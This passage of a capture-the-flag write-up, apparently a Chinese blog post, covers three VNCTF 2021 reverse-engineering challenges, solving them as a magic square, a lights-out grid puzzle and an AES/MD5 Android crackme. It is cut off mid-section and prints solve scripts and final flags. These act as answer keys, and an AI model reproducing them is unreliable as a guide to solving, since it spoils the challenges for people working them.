class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3059&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        print(い.に)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">2</span>:</span><br><span class="line">            print(い.ぬ)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> a == <span class="number">3</span>:</span><br><span class="line">                print(い.flag, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(a, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># check1，flag长度为偶数，每一个字符由&#x27;0&#x27;-&#x27;4&#x27;组成，md5(flag)[:6]==&#x27;e3a912&#x27;</span></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3061&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(い.に) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> い.に:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt; <span class="number">52</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i) &lt; <span class="number">48</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">    x = <span class="built_in">str</span>(hashlib.new(<span class="string">&#x27;md5&#x27;</span>, <span class="built_in">bytes</span>(い.に, encoding=<span class="string">&#x27;utf8&#x27;</span>)).hexdigest())</span><br><span class="line">    <span class="keyword">if</span> x[:<span class="number">6</span>] != <span class="string">&#x27;e3a912&#x27;</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    い.flag = x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对连续字符&#x27;ab&#x27;，将pic[a][b]从1开始依次赋值</span></span><br><span class="line"><span class="comment"># 例如对&#x27;011342&#x27;，则pic[0][1]=1,pic[1][3]=2,pic[4][2]=3...</span></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3068&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ふ = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(い.に), <span class="number">2</span>):</span><br><span class="line">        ふ += <span class="number">1</span></span><br><span class="line">        a = <span class="built_in">int</span>(い.に[i])</span><br><span class="line">        b = <span class="built_in">int</span>(い.に[i + <span class="number">1</span>])</span><br><span class="line">        い.ぬ[a][b] = ふ</span><br><span class="line"></span><br><span class="line"><span class="comment"># check2，检测对应位置是不是对应数字</span></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3064&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">0</span>][<span class="number">1</span>] != <span class="number">24</span> <span class="keyword">or</span> い.ぬ[<span class="number">4</span>][<span class="number">3</span>] != <span class="number">2</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">0</span>][<span class="number">2</span>] != <span class="number">1</span> <span class="keyword">or</span> い.ぬ[<span class="number">2</span>][<span class="number">3</span>] != <span class="number">20</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">1</span>][<span class="number">0</span>] != <span class="number">23</span> <span class="keyword">or</span> い.ぬ[<span class="number">3</span>][<span class="number">4</span>] != <span class="number">3</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># check3，检测每一行的和与每一列的和是否为い.ね即65</span></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3066&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ね = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            ね += い.ぬ[a][i]</span><br><span class="line">        <span class="keyword">if</span> ね != い.ね:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                ね += い.ぬ[i][b]</span><br><span class="line">            <span class="keyword">if</span> ね != い.ね:</span><br><span class="line">                sys.exit()</span><br></pre></td></tr></table></figure><p>这个逻辑捋下来不就是魔方阵吗&#x2F;doge。</p><p>好巧不巧，在我搜魔方阵的实现代码的时候，被我搜到了这个（<a href="https://www.linuxidc.com/Linux/2018-10/155082.htm">C语言实现魔方阵代码及解析_Linux编程_Linux公社-Linux系统门户网站</a>）：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315192329080.png"></p><p>诶，对应位置完全符合，相加也是65，绝了。</p><p>于是确定这个魔方阵就是题目想要的那个，于是写exp来通过这个阵生成flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">l=[[<span class="number">17</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">15</span>],</span><br><span class="line">   [<span class="number">23</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">16</span>],</span><br><span class="line">   [<span class="number">4</span>,<span class="number">6</span>,<span class="number">13</span>,<span class="number">20</span>,<span class="number">22</span>],</span><br><span class="line">   [<span class="number">10</span>,<span class="number">12</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">3</span>],</span><br><span class="line">   [<span class="number">11</span>,<span class="number">18</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">9</span>]]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag+=<span class="built_in">str</span>(row)+<span class="built_in">str</span>(l[row].index(i))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到input：<strong>02433420112112034430403122130414004132233324100142</strong></p><p>验证一下md5：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315192731841.png"></p><p>前六位吻合，拿到flag！</p><p><img src="/p/wpFor-2021VNCTF/image-20210315192835466.png"></p><p>flag：<strong>vnctf{e3a912c1e911ad82544af0c3d753f44f}</strong></p><h2 id="FilpGame"><a href="#FilpGame" class="headerlink" title="FilpGame"></a>FilpGame</h2><p>ida打开文件，直接从最后check部分看起：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315193239373.png"></p><p>可以看到word_40301C和unk_40303C在空间上是相连的</p><p><img src="/p/wpFor-2021VNCTF/image-20210315200235797.png"></p><p>也就是说这个check实际上的作用是检测word_40301C这个数组是不是都是-1（即0xFFFF，计算机中数据以补码形式存储）。</p><p>而唯一调用到这个word_40301C数组的地方就是<code>word_40301C[v13] ^= 1 &lt;&lt; (15 - v12)</code></p><p><img src="/p/wpFor-2021VNCTF/image-20210315200653184.png"></p><p>模拟一下就能知道，如果把这个数组当成一个棋盘，那这里的作用就是将bit[v13][v12]的位取反（其余位xor 0以后不变，从左往右数的v12位xor 1以后取反），这里需要对位运算有一点基本的了解。</p><p>随便画了个图方便理解：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315201843160.png"></p><p>而这里v12和v13加的两个数组为：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315202111026.png"></p><p>也就是说这种01翻转以<code>(-1,0),(0,0),(0,-1),(0,1),(1,0)</code>的方向拓展，即翻转bit[v13][v12]时，它的上下左右都会发生翻转。而我们需要做的就是翻转特定位置的bit，使所有bit都为1（想到了高斯消元和某些类似玩法的独立游戏。</p><p>再往上看可以发现，实际上是一个对我们的输入进行类似于unhex的过程，其中偶数位存在v4里，奇数位存在v5里。</p><p>举个栗子，如果我们输入“e3”，那么进行的处理就是<code>v4=0xe=14;v5=0x3=3;</code>，然后在奇数位时进行翻转处理（即翻转bit[3][14]及其上下左右）。</p><p><img src="/p/wpFor-2021VNCTF/image-20210315203149938.png"></p><p><img src="/p/wpFor-2021VNCTF/image-20210315203210576.png"></p><p>根据高斯消元算法找到了<a href="https://blog.csdn.net/lxy767087094/article/details/54693340">POJ 3279 Fliptile 开关问题_WA是一笔财富-CSDN博客</a>，用这里的脚本算答案（算法太菜了懒得自己写）。</p><p>先把原始的<code>word_40301C</code>数组输出成指定格式，注意poj的题目是1代表反面，0代表正面，最后需要所有都翻成正面向上（即全为0），而在我们这里是需要翻成全为1，所以输出的时候要对数组各位的状态取反。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dst=[<span class="number">0xBEF5</span>, <span class="number">0x8BBC</span>, <span class="number">0xA0E9</span>, <span class="number">0x7310</span>, <span class="number">0xD910</span>, <span class="number">0xA3AD</span>, <span class="number">0xCCB6</span>, <span class="number">0x4DDE</span>, <span class="number">0x344C</span>, <span class="number">0x3BD6</span>, <span class="number">0x6711</span>, <span class="number">0x868F</span>, <span class="number">0x1C7A</span>, <span class="number">0x8425</span>, <span class="number">0x6B0D</span>, <span class="number">0x1B4C</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dst:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">16</span>,<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">        print(<span class="built_in">int</span>(x)^<span class="number">1</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="/p/wpFor-2021VNCTF/image-20210315204338025.png"></p><p>然后把poj的解题脚本改为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi acos(-1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 99999999</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;P;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="keyword">int</span> mp[<span class="number">20</span>][<span class="number">20</span>],flip[<span class="number">20</span>][<span class="number">20</span>],ans[<span class="number">20</span>][<span class="number">20</span>];<span class="comment">//原数组、临时数组、结果数组</span></span><br><span class="line"><span class="keyword">int</span> go[<span class="number">5</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getcolor</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;<span class="comment">//判断某块地是正面还是反面</span></span><br><span class="line">    <span class="keyword">int</span> sum=mp[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">5</span>;k++)&#123;</span><br><span class="line">        <span class="keyword">int</span> di=i+go[k][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> dj=j+go[k][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>&lt;=di&amp;&amp;di&lt;m&amp;&amp;<span class="number">0</span>&lt;=dj&amp;&amp;dj&lt;n)</span><br><span class="line">        sum+=flip[di][dj];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum&amp;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;<span class="comment">//确定第一行的状态下判断是否有可行解</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;m;j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;</span><br><span class="line">            flip[j][k]=getcolor(j<span class="number">-1</span>,k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    <span class="keyword">if</span>(getcolor(m<span class="number">-1</span>,i))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">    sum+=flip[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=inf;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>&lt;&lt;n;i++)&#123;<span class="comment">//枚举第一行状态</span></span><br><span class="line">        <span class="built_in">memset</span>(flip,<span class="number">0</span>,<span class="keyword">sizeof</span>(flip));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            flip[<span class="number">0</span>][n<span class="number">-1</span>-j]=(i&gt;&gt;j)&amp;<span class="number">1</span>;<span class="comment">//集合的整数表示</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> t=check();</span><br><span class="line">         <span class="keyword">if</span>(t&gt;=<span class="number">0</span>&amp;&amp;res&gt;t)&#123;</span><br><span class="line">            res=t;</span><br><span class="line">            <span class="built_in">memcpy</span>(ans,flip,<span class="keyword">sizeof</span>(flip));</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res==inf)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IMPOSSIBLE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>,ans[i][j],<span class="string">&quot;,]&quot;</span>[j==n<span class="number">-1</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;m,&amp;n))&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;mp[i][j]);</span><br><span class="line">        solve();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315204727111.png"></p><p>然后写exp组织成input：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ans=[[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> ans[i][j]==<span class="number">1</span>:</span><br><span class="line">            flag+=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]+<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">flag=flag.upper()</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># 2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF</span></span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021VNCTF/image-20210315204945174.png"></p><p>成功过check：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315205054540.png"></p><p>flag是md5，所以输出一下md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag=<span class="string">b&quot;2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF&quot;</span></span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure><p>flag：<strong>vnctf{c51a6d6d3929cd2a0192572e604b371d}</strong></p><h2 id="Crackme2"><a href="#Crackme2" class="headerlink" title="Crackme2"></a>Crackme2</h2><p>密码题，表示安卓逆向一直是硬看的（</p><p>老规矩，解压apk，用ida打开<code>Crackme2/lib/arm64-v8a/libnative-lib.so</code>。</p><p>在函数搜索界面找到MainActivity主函数：</p><p><img src="/p/wpFor-2021VNCTF/image-20210315210329477.png"></p><p>从最后的check看起，很明显是让<code>xmmword_C80F0==v11</code>，v11为通过imput处理之后的结果，而xmmword_C80F0实际上是已知的。</p><p><img src="/p/wpFor-2021VNCTF/image-20210315210618557.png"></p><p>查交叉引用，可以看到<code>xmmword_C80F0=xmmword_A3880</code>，而xmmword_C80F0又已知，所以拿到了目标数组即密文。</p><p><img src="/p/wpFor-2021VNCTF/image-20210315210951220.png"></p><p><img src="/p/wpFor-2021VNCTF/image-20210315211002008.png"></p><p><img src="/p/wpFor-2021VNCTF/image-20210315211042147.png"></p><p>然后通过findcrypt插件找到AES的S box常数，通过交叉引用和函数伪代码确定<code>sub_42944</code>为AES的加密函数。</p><p>而上面<code>sub_40E80</code>很明显是给v21赋了几个常见常数</p><p><img src="/p/wpFor-2021VNCTF/image-20210315211642345.png"></p><p>乐了，这不就是md5常数吗。看了一下下面的几个函数，差不多确定了就是个md5。</p><p>然后猜测是用md5(“Hello from C++”)做key对密文进行AES解密，就能得到flag。</p><p>写exp尝试一下：</p><figure class="highlight 